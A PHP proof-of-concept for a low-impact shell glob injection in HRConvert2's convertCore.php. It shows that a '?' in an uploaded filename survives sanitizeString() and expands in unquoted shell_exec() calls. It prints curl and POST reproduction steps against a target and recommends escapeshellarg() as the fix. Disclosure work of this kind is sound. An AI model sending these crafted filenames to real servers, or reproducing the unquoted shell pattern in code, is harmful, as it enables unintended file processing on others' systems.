<?php
/**
 * PoC: HRConvert2 Shell Glob Injection via ? Character
 * 
 * Vulnerability: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
 * Affected: HRConvert2 <= 3.4.7
 * File: convertCore.php - all shell_exec() calls using unquoted file paths
 * 
 * Description:
 *   The sanitizeString() function in strict mode does NOT filter the ? character.
 *   When a filename containing ? is passed to shell_exec() without proper quoting,
 *   bash performs glob expansion, potentially matching and processing unintended files.
 * 
 * Impact: Low - glob expansion limited to same session directory
 * 
 * Fix: Use escapeshellarg() for all variables in shell_exec() calls
 */

// ==================================================
// STEP 1: Demonstrate ? survives sanitization
// ==================================================

function sanitizeString($Variable, $strict) {
  if ($strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  if (!$strict) $Variable = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\[](){};"\''.'`'.chr(9).chr(10).chr(13).chr(0)), '', $Variable))))), '-'), ENT_QUOTES, 'UTF-8');
  return $Variable;
}

echo "[*] HRConvert2 Shell Glob Injection PoC\n";
echo "[*] ====================================\n\n";

// Prove ? survives
$malicious_filename = 'file?.jpg';
$sanitized = sanitizeString($malicious_filename, TRUE);
echo "[+] Uploaded filename: '$malicious_filename'\n";
echo "[+] After sanitizeString(strict): '$sanitized'\n";
echo "[+] ? character preserved: " . (strpos($sanitized, '?') !== false ? "YES ✓" : "NO ✗") . "\n\n";

// ==================================================
// STEP 2: Simulate the vulnerable environment
// ==================================================

$testDir = '/tmp/hrconvert2_glob_poc/';
@exec("rm -rf $testDir");
@mkdir($testDir, 0777, true);

// Simulate user's ConvertDir with multiple files
file_put_contents($testDir . 'fileA.jpg', str_repeat("\xFF\xD8", 10)); // fake JPEG
file_put_contents($testDir . 'fileB.jpg', str_repeat("\xFF\xD8", 10));
file_put_contents($testDir . 'fileC.jpg', str_repeat("\xFF\xD8", 10));
file_put_contents($testDir . 'file?.jpg', str_repeat("\xFF\xD8", 10)); // literal ? in name

echo "[*] Created test files in $testDir:\n";
$files = glob($testDir . '*.jpg');
foreach ($files as $f) echo "    " . basename($f) . "\n";
echo "\n";

// ==================================================
// STEP 3: Show shell glob expansion
// ==================================================

echo "[*] Simulating HRConvert2 shell_exec() behavior:\n\n";

// This is what HRConvert2 does (VULNERABLE - no quoting):
$vulnerable_cmd = "ls " . $testDir . "file?.jpg 2>/dev/null";
echo "[!] Vulnerable command (no escaping):\n";
echo "    ls {$testDir}file?.jpg\n";
$result = trim(shell_exec($vulnerable_cmd));
echo "[!] Bash glob expansion result:\n";
foreach (explode("\n", $result) as $line) echo "    $line\n";
echo "\n";

// This is what it SHOULD do (SAFE - with escapeshellarg):
$safe_cmd = "ls " . escapeshellarg($testDir . "file?.jpg") . " 2>/dev/null";
echo "[+] Safe command (with escapeshellarg):\n";
echo "    ls " . escapeshellarg($testDir . "file?.jpg") . "\n";
$result = trim(shell_exec($safe_cmd));
echo "[+] No glob expansion:\n";
echo "    $result\n\n";

// ==================================================
// STEP 4: Demonstrate with ImageMagick-like command
// ==================================================

echo "[*] Simulating ImageMagick 'convert' command (convertImages line 902):\n\n";

$ConvertTempDir = $testDir;
$file = $sanitized; // 'file?.jpg' after sanitization

// What HRConvert2 actually executes:
$pathname = $ConvertTempDir . $file;
$newPathname = $testDir . 'output.png';
$command = 'echo convert -background none ' . $pathname . ' ' . $newPathname;

echo "[!] HRConvert2 would execute:\n";
echo "    convert -background none $pathname $newPathname\n\n";

echo "[!] After bash glob expansion, this becomes:\n";
$expanded = trim(shell_exec("echo " . $pathname));
echo "    convert -background none $expanded $newPathname\n\n";

$matchCount = count(explode(' ', $expanded));
echo "[!] Glob matched $matchCount files instead of 1!\n";
echo "[!] All matching files would be processed by ImageMagick.\n\n";

// ==================================================
// STEP 5: Demonstrate with ClamAV command
// ==================================================

echo "[*] Simulating ClamAV command (userClamScan line ~1947):\n\n";

$ConvertDir = $testDir;
$UserClamLogFile = $testDir . 'clamlog.txt';
file_put_contents($UserClamLogFile, '');

// What HRConvert2 would execute:
$clamCmd = 'clamscan -r ' . $ConvertDir . $file . ' | grep FOUND >> ' . $UserClamLogFile;
echo "[!] HRConvert2 would execute:\n";
echo "    $clamCmd\n\n";

// Show glob expansion
$expandedPath = trim(shell_exec("echo " . $ConvertDir . $file));
echo "[!] After glob expansion, clamscan would scan:\n";
foreach (explode(' ', $expandedPath) as $p) echo "    $p\n";
echo "\n";

// ==================================================
// STEP 6: Verification that file_exists() allows it
// ==================================================

echo "[*] PHP file_exists() check (verifyFile validation):\n";
echo "    file_exists('$pathname'): " . var_export(file_exists($pathname), true) . "\n";
echo "    PHP file_exists does NOT glob - literal file exists ✓\n";
echo "    verifyFile() would PASS this check.\n\n";

// ==================================================
// CLEANUP
// ==================================================

exec("rm -rf $testDir");

echo "[*] ====================================\n";
echo "[*] SUMMARY:\n";
echo "[*]   - ? character passes through sanitizeString(strict)\n";
echo "[*]   - Bash glob expands ? to match single characters\n";
echo "[*]   - shell_exec() does not quote file paths\n";
echo "[*]   - PHP file_exists() passes (literal file exists)\n";
echo "[*]   - Impact: process unintended files in same directory\n";
echo "[*] ====================================\n\n";

echo "[*] REPRODUCTION STEPS:\n";
echo "    1. Upload file with ? in name via HTTP multipart:\n";
echo "       curl -F 'file=@dummy.jpg;filename=file?.jpg' http://target/convertCore.php\n";
echo "    2. Submit conversion request:\n";
echo "       POST convertSelected[]=file?.jpg&extension=png&userconvertfilename=out\n";
echo "    3. Server executes:\n";
echo "       convert -background none /path/file?.jpg /path/out.png\n";
echo "    4. Bash expands file?.jpg to all matching files (fileA.jpg, fileB.jpg, etc.)\n\n";

echo "[*] FIX:\n";
echo "    Replace: shell_exec('convert ... '.\$pathname.' '.\$newPathname)\n";
echo "    With:    shell_exec('convert ... '.escapeshellarg(\$pathname).' '.escapeshellarg(\$newPathname))\n";
?>
